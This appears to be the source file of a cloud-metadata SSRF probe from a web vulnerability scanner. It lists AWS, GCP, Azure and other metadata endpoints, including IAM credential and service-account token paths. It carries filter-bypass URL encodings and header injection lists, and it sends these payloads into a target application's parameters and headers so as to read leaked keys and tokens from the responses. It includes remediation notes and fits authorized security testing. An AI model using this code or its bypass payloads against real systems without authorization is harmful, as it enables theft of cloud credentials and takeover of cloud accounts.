# modules/cloud_metadata_probe.py
import re
import time
import uuid
import socket
import hashlib
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------------------------------------------------------------------
# Metadata endpoint catalogue
# ---------------------------------------------------------------------------
#
# Each entry:
#   (url, provider, label, evidence_pattern, severity, requires_header)
# ---------------------------------------------------------------------------

@dataclass
class MetadataEndpoint:
    url:              str
    provider:         str
    label:            str
    evidence_re:      str
    severity:         str
    headers:          Dict[str, str]      # required request headers
    phase:            str                 # direct / ssrf


_METADATA_TARGETS: List[MetadataEndpoint] = [

    # ── AWS IMDS v1 ────────────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/latest/meta-data/",
        provider="AWS", label="imds-v1-root",
        evidence_re=r"(ami-id|instance-id|hostname|public-ipv4|security-groups)",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/latest/meta-data/instance-id",
        provider="AWS", label="imds-v1-instance-id",
        evidence_re=r"i-[0-9a-f]{8,17}",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        provider="AWS", label="imds-v1-iam-credentials-list",
        evidence_re=r"[a-zA-Z0-9_/-]+",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/latest/meta-data/hostname",
        provider="AWS", label="imds-v1-hostname",
        evidence_re=r"\.compute\.internal|\.ec2\.internal",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/latest/meta-data/public-ipv4",
        provider="AWS", label="imds-v1-public-ip",
        evidence_re=r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/latest/user-data",
        provider="AWS", label="imds-v1-user-data",
        evidence_re=r"(#!/|cloud-config|userdata|base64|password|secret)",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/latest/dynamic/instance-identity/document",
        provider="AWS", label="imds-v1-identity-document",
        evidence_re=r"(accountId|region|imageId|instanceType)",
        severity="critical", headers={}, phase="direct",
    ),

    # ── AWS IMDS v2 (token-required) ───────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/latest/meta-data/instance-id",
        provider="AWS", label="imds-v2-instance-id",
        evidence_re=r"i-[0-9a-f]{8,17}",
        severity="critical",
        headers={"X-aws-ec2-metadata-token": "__AWS_TOKEN__"},
        phase="direct",
    ),

    # ── GCP Metadata Server ────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/",
        provider="GCP", label="gcp-metadata-root",
        evidence_re=r"(instance|project|id|description|hostname)",
        severity="critical",
        headers={"Metadata-Flavor": "Google"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/instance/",
        provider="GCP", label="gcp-instance",
        evidence_re=r"(id|name|zone|hostname|serviceAccounts|tags)",
        severity="critical",
        headers={"Metadata-Flavor": "Google"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        provider="GCP", label="gcp-service-account-token",
        evidence_re=r"(access_token|token_type|expires_in)",
        severity="critical",
        headers={"Metadata-Flavor": "Google"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/project/project-id",
        provider="GCP", label="gcp-project-id",
        evidence_re=r"[a-z0-9-]{6,30}",
        severity="critical",
        headers={"Metadata-Flavor": "Google"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/computeMetadata/v1/instance/",
        provider="GCP", label="gcp-alt-ip",
        evidence_re=r"(id|name|zone|hostname)",
        severity="critical",
        headers={"Metadata-Flavor": "Google"},
        phase="direct",
    ),

    # ── Azure IMDS ─────────────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/metadata/instance",
        provider="Azure", label="azure-instance",
        evidence_re=r"(subscriptionId|resourceGroupName|vmId|location|name)",
        severity="critical",
        headers={"Metadata": "true"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        provider="Azure", label="azure-instance-v2021",
        evidence_re=r"(subscriptionId|vmId|location|publicIpAddress)",
        severity="critical",
        headers={"Metadata": "true"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        provider="Azure", label="azure-msi-token",
        evidence_re=r"(access_token|token_type|client_id)",
        severity="critical",
        headers={"Metadata": "true"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
        provider="Azure", label="azure-scheduled-events",
        evidence_re=r"(Events|DocumentIncarnation)",
        severity="high",
        headers={"Metadata": "true"},
        phase="direct",
    ),

    # ── DigitalOcean ───────────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/metadata/v1.json",
        provider="DigitalOcean", label="do-metadata-json",
        evidence_re=r"(droplet_id|hostname|region|interfaces|public_keys)",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/metadata/v1/id",
        provider="DigitalOcean", label="do-instance-id",
        evidence_re=r"\d{6,12}",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/metadata/v1/user-data",
        provider="DigitalOcean", label="do-user-data",
        evidence_re=r"(#!/|cloud-config|password|secret|token)",
        severity="critical", headers={}, phase="direct",
    ),

    # ── Alibaba Cloud ECS ──────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://100.100.100.200/latest/meta-data/",
        provider="Alibaba", label="ali-metadata-root",
        evidence_re=r"(instance-id|hostname|region-id|zone-id)",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://100.100.100.200/latest/meta-data/instance-id",
        provider="Alibaba", label="ali-instance-id",
        evidence_re=r"i-[a-z0-9]{15,25}",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        provider="Alibaba", label="ali-iam-credentials",
        evidence_re=r"[a-zA-Z0-9_/-]+",
        severity="critical", headers={}, phase="direct",
    ),

    # ── Oracle Cloud Infrastructure ────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/opc/v2/instance/",
        provider="OCI", label="oci-instance-v2",
        evidence_re=r"(compartmentId|id|region|shape|displayName)",
        severity="critical",
        headers={"Authorization": "Bearer Oracle"},
        phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/opc/v1/instance/",
        provider="OCI", label="oci-instance-v1",
        evidence_re=r"(compartmentId|id|region|shape)",
        severity="critical", headers={}, phase="direct",
    ),

    # ── IBM Cloud / SoftLayer ──────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/openstack/2012-08-10/meta_data.json",
        provider="IBM", label="ibm-openstack-meta",
        evidence_re=r"(uuid|hostname|public_keys|availability_zone)",
        severity="critical", headers={}, phase="direct",
    ),

    # ── Linode ─────────────────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/v1.json",
        provider="Linode", label="linode-metadata",
        evidence_re=r"(id|region|type|image|label)",
        severity="critical", headers={}, phase="direct",
    ),

    # ── Hetzner Cloud ──────────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/hetzner/v1/metadata",
        provider="Hetzner", label="hetzner-metadata",
        evidence_re=r"(hostname|instance-id|public-ipv4|region)",
        severity="high", headers={}, phase="direct",
    ),

    # ── Vultr ──────────────────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/v1.json",
        provider="Vultr", label="vultr-metadata",
        evidence_re=r"(instanceid|hostname|region|bgp|ipv4)",
        severity="critical", headers={}, phase="direct",
    ),

    # ── Kubernetes service account token ──────────────────────────────────
    MetadataEndpoint(
        url="http://kubernetes.default.svc/api/",
        provider="Kubernetes", label="k8s-api",
        evidence_re=r"(apiVersion|kind|paths|groups)",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://kubernetes.default.svc.cluster.local/api/",
        provider="Kubernetes", label="k8s-api-fqdn",
        evidence_re=r"(apiVersion|kind|paths)",
        severity="critical", headers={}, phase="direct",
    ),

    # ── OpenStack ─────────────────────────────────────────────────────────
    MetadataEndpoint(
        url="http://169.254.169.254/openstack/",
        provider="OpenStack", label="openstack-root",
        evidence_re=r"(2012|2013|2014|2015|2016|2017|latest)",
        severity="critical", headers={}, phase="direct",
    ),
    MetadataEndpoint(
        url="http://169.254.169.254/openstack/latest/meta_data.json",
        provider="OpenStack", label="openstack-metadata",
        evidence_re=r"(uuid|hostname|public_keys|availability_zone|launch_index)",
        severity="critical", headers={}, phase="direct",
    ),
]

# ---------------------------------------------------------------------------
# SSRF parameter targets
# ---------------------------------------------------------------------------
#
# Common URL/file parameters that may be vulnerable to SSRF.
# Used to test whether the web application fetches the metadata URL.
# ---------------------------------------------------------------------------

_SSRF_PARAMS: List[str] = [
    "url", "uri", "src", "source", "img", "image", "file", "path",
    "fetch", "load", "href", "link", "resource", "endpoint", "callback",
    "webhook", "proxy", "ping", "target", "host", "to", "from",
    "destination", "addr", "request", "redirect", "next", "return",
    "open", "ref", "u", "q",
]

# Common paths that accept URL parameters
_SSRF_PROBE_PATHS: List[str] = [
    "/", "/api/v1/fetch", "/api/fetch", "/api/proxy", "/api/url",
    "/api/v1/proxy", "/proxy", "/fetch", "/url", "/open",
    "/redirect", "/forward", "/import", "/export",
    "/api/v1/image", "/api/image", "/api/v1/file",
    "/webhook", "/api/webhook", "/callback",
    "/api/v1/check", "/api/check", "/health/check",
    "/api/v1/scan", "/api/scan",
    "/api/v1/validate", "/api/validate",
    "/api/v1/render", "/api/render",
    "/api/v1/convert", "/api/convert",
]

# SSRF bypass variants — some filters block 169.254.169.254 directly
_SSRF_BYPASS_URLS: Dict[str, List[str]] = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://0251.0376.0251.0376/latest/meta-data/",   # octal
        "http://0xa9fea9fe/latest/meta-data/",             # hex
        "http://2852039166/latest/meta-data/",             # decimal
        "http://169.254.169.254%09/latest/meta-data/",     # tab
        "http://169.254.169.254%0a/latest/meta-data/",     # newline
        "http://169.254.169.254%2f%2f/latest/meta-data/",
        "http://ident.me/",   # external IP reflection as SSRF canary
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata/computeMetadata/v1/",
        "http://metadata.google.internal./computeMetadata/v1/",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
}

# Evidence patterns that confirm SSRF to metadata service
_SSRF_EVIDENCE_RE = re.compile(
    r"(ami-id|instance-id|instance-type|subscriptionId|vmId|"
    r"droplet_id|compartmentId|computeMetadata|metadata\.google|"
    r"access_token|token_type|\.compute\.internal|ec2\.internal|"
    r"i-[0-9a-f]{8,17}|ASIA|AKIA|AROA|accountId|regionId)",
    re.I,
)

# ---------------------------------------------------------------------------
# AWS IMDSv2 token acquisition
# ---------------------------------------------------------------------------

def _get_imdsv2_token(session: requests.Session, timeout: float) -> Optional[str]:
    """
    Attempt to acquire an AWS IMDSv2 session token via PUT request.
    Returns token string or None.
    """
    try:
        resp = session.put(
            "http://169.254.169.254/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=timeout,
        )
        if resp.status_code == 200 and resp.text:
            return resp.text.strip()
    except requests.RequestException:
        pass
    return None


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class MetadataHit:
    url:          str
    provider:     str
    label:        str
    phase:        str           # direct / ssrf
    ssrf_param:   Optional[str]
    ssrf_target_path: Optional[str]
    status_code:  int
    response_body:str           # first 500 chars
    evidence:     str           # matched pattern
    severity:     str
    access_token_leaked: bool   # found access_token / secret in response
    credentials_leaked:  bool   # found AWS key pattern or similar


@dataclass
class CloudMetaFinding:
    provider:     str
    label:        str
    phase:        str
    severity:     str
    title:        str
    detail:       str
    url:          str
    evidence:     str
    cwe:          str
    cvss:         float
    remediation:  str


@dataclass
class ScanState:
    target_url:   str
    hits:         List[MetadataHit]
    findings:     List[CloudMetaFinding]
    imdsv2_token: Optional[str]
    lock:         threading.Lock = field(default_factory=threading.Lock)


# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=1, backoff_factor=0.2, status_forcelist=[])
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=20,
        pool_maxsize=40,
    )
    session.mount("https://", adapter)
    session.mount("http://",  adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"
    })
    return session


def _req(
    session:  requests.Session,
    method:   str,
    url:      str,
    headers:  Optional[Dict] = None,
    params:   Optional[Dict] = None,
    timeout:  float = 5.0,
) -> Optional[requests.Response]:
    try:
        return session.request(
            method.upper(), url,
            headers=headers or {},
            params=params,
            timeout=timeout,
            allow_redirects=False,
            stream=True,
        )
    except requests.RequestException:
        return None


def _read_limited(resp: requests.Response, max_bytes: int = 2048) -> str:
    """Read up to max_bytes from a streaming response."""
    try:
        content = b"".join(
            chunk for chunk in resp.iter_content(512)
            if chunk
        )[:max_bytes]
        resp.close()
        return content.decode("utf-8", errors="replace")
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# Credential pattern detection
# ---------------------------------------------------------------------------

_AWS_KEY_RE = re.compile(
    r"(ASIA|AKIA|AROA|AIDA)[A-Z0-9]{16}", re.I
)
_TOKEN_RE = re.compile(
    r'"(access_token|token_type|client_secret|SecretAccessKey|"Token")"'
    r'\s*:\s*"([^"]{10,})"',
    re.I,
)
_GENERIC_SECRET_RE = re.compile(
    r"(password|secret|key|token|credential)\s*[:=]\s*\S{8,}",
    re.I,
)


def _detect_credentials(body: str) -> Tuple[bool, bool]:
    """Returns (access_token_leaked, credentials_leaked)."""
    token_found = bool(_TOKEN_RE.search(body))
    creds_found = bool(_AWS_KEY_RE.search(body) or _GENERIC_SECRET_RE.search(body))
    return token_found, creds_found


# ---------------------------------------------------------------------------
# Phase 1 — Direct metadata endpoint probing
# ---------------------------------------------------------------------------

def _probe_direct(
    session:   requests.Session,
    endpoint:  MetadataEndpoint,
    imdsv2_tok:Optional[str],
    timeout:   float,
    rate_delay:float,
) -> Optional[MetadataHit]:
    """
    Directly request a cloud metadata URL.
    Primarily detects when the scanner itself is running inside a cloud VM,
    or confirms internal server reachability.
    """
    if rate_delay > 0:
        time.sleep(rate_delay)

    hdrs = dict(endpoint.headers)
    if "__AWS_TOKEN__" in hdrs.values() and imdsv2_tok:
        hdrs = {k: imdsv2_tok if v == "__AWS_TOKEN__" else v
                for k, v in hdrs.items()}
    elif "__AWS_TOKEN__" in hdrs.values():
        return None   # IMDSv2 token not available

    resp = _req(session, "GET", endpoint.url, headers=hdrs, timeout=timeout)
    if not resp:
        return None

    if resp.status_code not in (200, 201, 206):
        resp.close()
        return None

    body = _read_limited(resp)
    if not re.search(endpoint.evidence_re, body, re.I | re.S):
        return None

    evidence  = re.search(endpoint.evidence_re, body, re.I).group(0)[:80]
    tok_found, cred_found = _detect_credentials(body)

    return MetadataHit(
        url=endpoint.url,
        provider=endpoint.provider,
        label=endpoint.label,
        phase="direct",
        ssrf_param=None,
        ssrf_target_path=None,
        status_code=resp.status_code,
        response_body=body[:500],
        evidence=evidence,
        severity=endpoint.severity,
        access_token_leaked=tok_found,
        credentials_leaked=cred_found,
    )


# ---------------------------------------------------------------------------
# Phase 2 — SSRF via application parameters
# ---------------------------------------------------------------------------

def _probe_ssrf_param(
    session:        requests.Session,
    app_base_url:   str,
    app_path:       str,
    param:          str,
    metadata_url:   str,
    provider:       str,
    timeout:        float,
    rate_delay:     float,
) -> Optional[MetadataHit]:
    """
    Inject a metadata URL into an application parameter (GET/POST).
    If the application fetches it and returns the response, we have SSRF.
    """
    if rate_delay > 0:
        time.sleep(rate_delay)

    full_url = app_base_url.rstrip("/") + app_path

    # GET
    resp = _req(
        session, "GET", full_url,
        params={param: metadata_url},
        timeout=timeout,
    )
    body = ""
    if resp:
        body = _read_limited(resp)
        if _SSRF_EVIDENCE_RE.search(body):
            evidence = _SSRF_EVIDENCE_RE.search(body).group(0)[:80]
            tok, cred = _detect_credentials(body)
            return MetadataHit(
                url=full_url,
                provider=provider,
                label=f"ssrf-{provider.lower()}-{param}",
                phase="ssrf",
                ssrf_param=param,
                ssrf_target_path=metadata_url,
                status_code=resp.status_code,
                response_body=body[:500],
                evidence=evidence,
                severity="critical",
                access_token_leaked=tok,
                credentials_leaked=cred,
            )

    # POST with JSON body
    try:
        resp2 = session.post(
            full_url,
            json={param: metadata_url},
            headers={"Content-Type": "application/json"},
            timeout=timeout,
            allow_redirects=False,
            stream=True,
        )
        body2 = _read_limited(resp2)
        if _SSRF_EVIDENCE_RE.search(body2):
            evidence = _SSRF_EVIDENCE_RE.search(body2).group(0)[:80]
            tok, cred = _detect_credentials(body2)
            return MetadataHit(
                url=full_url,
                provider=provider,
                label=f"ssrf-{provider.lower()}-{param}-post",
                phase="ssrf",
                ssrf_param=param,
                ssrf_target_path=metadata_url,
                status_code=resp2.status_code,
                response_body=body2[:500],
                evidence=evidence,
                severity="critical",
                access_token_leaked=tok,
                credentials_leaked=cred,
            )
    except requests.RequestException:
        pass

    return None


# ---------------------------------------------------------------------------
# Phase 3 — Header-based SSRF
# ---------------------------------------------------------------------------

_SSRF_HEADERS: List[str] = [
    "X-Forwarded-For", "X-Forwarded-Host", "X-Original-URL",
    "X-Rewrite-URL", "Client-IP", "X-Remote-IP",
    "X-Real-IP", "X-Host", "Host",
    "X-Backend-URL", "Destination",
    "Redirect", "Referer", "X-Proxy-URL",
]

_METADATA_IPS = [
    "169.254.169.254",
    "metadata.google.internal",
]


def _probe_ssrf_header(
    session:      requests.Session,
    app_url:      str,
    header_name:  str,
    metadata_ip:  str,
    timeout:      float,
    rate_delay:   float,
) -> Optional[MetadataHit]:
    """
    Inject a metadata IP into request headers that some proxies forward
    or use for routing decisions.
    """
    if rate_delay > 0:
        time.sleep(rate_delay)

    resp = _req(session, "GET", app_url,
                headers={header_name: metadata_ip},
                timeout=timeout)
    if not resp:
        return None

    body = _read_limited(resp)
    if not _SSRF_EVIDENCE_RE.search(body):
        return None

    evidence = _SSRF_EVIDENCE_RE.search(body).group(0)[:80]
    tok, cred = _detect_credentials(body)

    return MetadataHit(
        url=app_url,
        provider="unknown",
        label=f"ssrf-header-{header_name.lower()}",
        phase="ssrf",
        ssrf_param=header_name,
        ssrf_target_path=metadata_ip,
        status_code=resp.status_code,
        response_body=body[:500],
        evidence=evidence,
        severity="critical",
        access_token_leaked=tok,
        credentials_leaked=cred,
    )


# ---------------------------------------------------------------------------
# Finding synthesis
# ---------------------------------------------------------------------------

_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

_REMEDIATIONS: Dict[str, str] = {
    "AWS": (
        "1. Enforce IMDSv2 (require session-oriented requests). "
        "2. Restrict SSRF via outbound firewall rules blocking 169.254.169.254. "
        "3. Apply least-privilege IAM roles — do not attach admin roles to EC2 instances."
    ),
    "GCP": (
        "1. Use Workload Identity instead of service account key files. "
        "2. Block 169.254.169.254 and metadata.google.internal at the network level for untrusted workloads. "
        "3. Enable metadata concealment on GKE node pools."
    ),
    "Azure": (
        "1. Use Managed Identity instead of credentials in environment variables. "
        "2. Apply network policies blocking 169.254.169.254 for untrusted pods. "
        "3. Restrict managed identity scopes to minimum required resources."
    ),
    "DigitalOcean": (
        "1. Store secrets in DigitalOcean Secrets Manager, not user-data. "
        "2. Block 169.254.169.254 at the droplet firewall level."
    ),
    "default": (
        "1. Block outbound requests to 169.254.169.254 and cloud metadata IPs via firewall. "
        "2. Validate and sanitise all URL parameters before making server-side requests. "
        "3. Use an allowlist for outbound HTTP requests from the application."
    ),
}


def _synthesise_findings(state: ScanState) -> List[CloudMetaFinding]:
    findings: List[CloudMetaFinding] = []

    for hit in state.hits:
        rem = _REMEDIATIONS.get(hit.provider, _REMEDIATIONS["default"])

        # Credential / token leakage — upgrade severity
        extra = ""
        if hit.access_token_leaked:
            extra += " Access token / OAuth credential found in response."
        if hit.credentials_leaked:
            extra += " Cloud credentials (key/secret) found in response."

        if hit.phase == "direct":
            findings.append(CloudMetaFinding(
                provider=hit.provider,
                label=hit.label,
                phase="direct",
                severity=hit.severity,
                title=f"{hit.provider} Cloud Metadata Accessible: {hit.label}",
                detail=(
                    f"The {hit.provider} instance metadata service is directly reachable "
                    f"at {hit.url}. This confirms the scanner is running inside a "
                    f"{hit.provider} environment and the IMDS is not restricted. "
                    f"An attacker with SSRF can reach the same endpoint." + extra
                ),
                url=hit.url,
                evidence=hit.evidence,
                cwe="CWE-918",
                cvss=9.8 if (hit.access_token_leaked or hit.credentials_leaked) else 8.6,
                remediation=rem,
            ))

        elif hit.phase == "ssrf":
            findings.append(CloudMetaFinding(
                provider=hit.provider,
                label=hit.label,
                phase="ssrf",
                severity="critical",
                title=f"SSRF to {hit.provider} Metadata via param={hit.ssrf_param!r}",
                detail=(
                    f"The application fetched {hit.ssrf_target_path} via "
                    f"parameter '{hit.ssrf_param}' on {hit.url} and returned "
                    f"cloud metadata in the response. "
                    f"An attacker can steal IAM credentials and escalate privileges." + extra
                ),
                url=hit.url,
                evidence=hit.evidence,
                cwe="CWE-918",
                cvss=9.8,
                remediation=rem,
            ))

    # Deduplicate by (provider, phase, label)
    seen: Set[Tuple] = set()
    unique: List[CloudMetaFinding] = []
    for f in findings:
        key = (f.provider, f.phase, f.label)
        if key not in seen:
            seen.add(key)
            unique.append(f)

    unique.sort(key=lambda f: _SEV_ORDER.get(f.severity, 9))
    return unique


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class CloudMetadataProbe:
    """
    Cloud IMDS SSRF probe.

    Three attack phases:

      Phase 1 — Direct IMDS access
                Tests whether the scanner itself can reach AWS/GCP/Azure/DO/
                Alibaba/OCI/IBM/Linode/Hetzner/Vultr/Kubernetes/OpenStack
                metadata endpoints directly (confirms cloud environment +
                detects misconfigured hop-less access).

      Phase 2 — SSRF via URL parameters
                Injects metadata URLs into 25+ common URL/file/proxy params
                across 20 application paths. Tests GET + POST (JSON body).
                Includes bypass variants (octal, hex, decimal, IPv6-mapped).

      Phase 3 — SSRF via HTTP headers
                Injects metadata IPs into X-Forwarded-For, X-Host,
                X-Original-URL and 10 other routing headers.

    Usage in app.py:
        probe = CloudMetadataProbe(target_url=f"https://{domain}")
        results = probe.scan()
        scan_results[scan_id]['cloud_metadata'] = results
    """

    def __init__(
        self,
        target_url:  str,
        timeout:     float = 5.0,
        max_workers: int   = 15,
        rate_delay:  float = 0.15,
        proxy:       Optional[str] = None,
        skip_direct: bool  = False,
        skip_ssrf:   bool  = False,
    ):
        self.target_url  = target_url.rstrip("/")
        self.timeout     = timeout
        self.max_workers = max_workers
        self.rate_delay  = rate_delay
        self.proxy       = proxy
        self.skip_direct = skip_direct
        self.skip_ssrf   = skip_ssrf

    def scan(self) -> Dict:
        import urllib3
        import time as _time
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        t0 = _time.monotonic()
        print(f"[cloud_meta] target : {self.target_url}")

        session = _build_session(self.proxy)
        state   = ScanState(
            target_url=self.target_url,
            hits=[],
            findings=[],
            imdsv2_token=None,
        )

        # Try to get IMDSv2 token (useful if running inside AWS)
        state.imdsv2_token = _get_imdsv2_token(session, self.timeout)
        if state.imdsv2_token:
            print(f"[cloud_meta] IMDSv2 token acquired")

        # ── Phase 1: direct metadata probing ──────────────────────────────
        if not self.skip_direct:
            print(f"[cloud_meta] phase 1: direct IMDS probe ({len(_METADATA_TARGETS)} endpoints)")
            with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
                futures = {
                    ex.submit(
                        _probe_direct, session, ep,
                        state.imdsv2_token, self.timeout, self.rate_delay,
                    ): ep.label
                    for ep in _METADATA_TARGETS
                }
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        with state.lock:
                            state.hits.append(r)
                        print(
                            f"  [cloud_meta] HIT [{r.provider}] "
                            f"{r.label} evidence={r.evidence[:50]}"
                        )

        # ── Phase 2: SSRF via URL parameters ──────────────────────────────
        if not self.skip_ssrf:
            # Build task list: path × param × metadata_url (top targets only)
            ssrf_targets = [
                ("AWS",   "http://169.254.169.254/latest/meta-data/"),
                ("AWS",   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
                ("GCP",   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
                ("Azure", "http://169.254.169.254/metadata/instance"),
                ("AWS",   "http://0xa9fea9fe/latest/meta-data/"),    # hex bypass
                ("AWS",   "http://2852039166/latest/meta-data/"),    # decimal bypass
            ]

            tasks = [
                (path, param, meta_url, provider)
                for path in _SSRF_PROBE_PATHS[:10]   # cap paths
                for param in _SSRF_PARAMS[:12]       # cap params
                for provider, meta_url in ssrf_targets[:4]  # cap targets
            ]

            print(f"[cloud_meta] phase 2: SSRF param probe ({len(tasks)} tasks)")
            with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
                futures = {
                    ex.submit(
                        _probe_ssrf_param, session,
                        self.target_url, path, param,
                        meta_url, provider,
                        self.timeout, self.rate_delay,
                    ): (path, param, provider)
                    for path, param, meta_url, provider in tasks
                }
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        with state.lock:
                            state.hits.append(r)
                        print(
                            f"  [cloud_meta] SSRF HIT param={r.ssrf_param} "
                            f"target={r.ssrf_target_path[:50]} "
                            f"evidence={r.evidence[:40]}"
                        )

            # ── Phase 3: SSRF via headers ──────────────────────────────────
            header_tasks = [
                (self.target_url, hdr, ip)
                for hdr in _SSRF_HEADERS
                for ip in _METADATA_IPS
            ]
            print(f"[cloud_meta] phase 3: SSRF header probe ({len(header_tasks)} tasks)")
            with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
                futures = {
                    ex.submit(
                        _probe_ssrf_header, session, app_url, hdr, ip,
                        self.timeout, self.rate_delay,
                    ): (hdr, ip)
                    for app_url, hdr, ip in header_tasks
                }
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        with state.lock:
                            state.hits.append(r)
                        print(
                            f"  [cloud_meta] SSRF HEADER HIT "
                            f"header={r.ssrf_param} "
                            f"evidence={r.evidence[:40]}"
                        )

        # ── Finding synthesis ──────────────────────────────────────────────
        state.findings = _synthesise_findings(state)

        providers_hit = list(dict.fromkeys(h.provider for h in state.hits))
        sev_counts:  Dict[str, int] = {}
        for f in state.findings:
            sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1

        elapsed = _time.monotonic() - t0
        print(
            f"[cloud_meta] done | "
            f"hits={len(state.hits)} "
            f"findings={len(state.findings)} "
            f"providers={providers_hit} "
            f"elapsed={elapsed:.1f}s"
        )

        return {
            "target":           self.target_url,
            "imdsv2_available": bool(state.imdsv2_token),
            "total_hits":       len(state.hits),
            "providers_hit":    providers_hit,
            "total_findings":   len(state.findings),
            "severity_summary": sev_counts,
            "elapsed_seconds":  round(elapsed, 2),
            "hits": [
                {
                    "url":          h.url,
                    "provider":     h.provider,
                    "label":        h.label,
                    "phase":        h.phase,
                    "ssrf_param":   h.ssrf_param,
                    "ssrf_target":  h.ssrf_target_path,
                    "status_code":  h.status_code,
                    "evidence":     h.evidence,
                    "severity":     h.severity,
                    "token_leaked": h.access_token_leaked,
                    "creds_leaked": h.credentials_leaked,
                    "response":     h.response_body[:300],
                }
                for h in state.hits
            ],
            "findings": [
                {
                    "provider":    f.provider,
                    "label":       f.label,
                    "phase":       f.phase,
                    "severity":    f.severity,
                    "title":       f.title,
                    "detail":      f.detail,
                    "url":         f.url,
                    "evidence":    f.evidence,
                    "cwe":         f.cwe,
                    "cvss":        f.cvss,
                    "remediation": f.remediation,
                }
                for f in state.findings
            ],
        }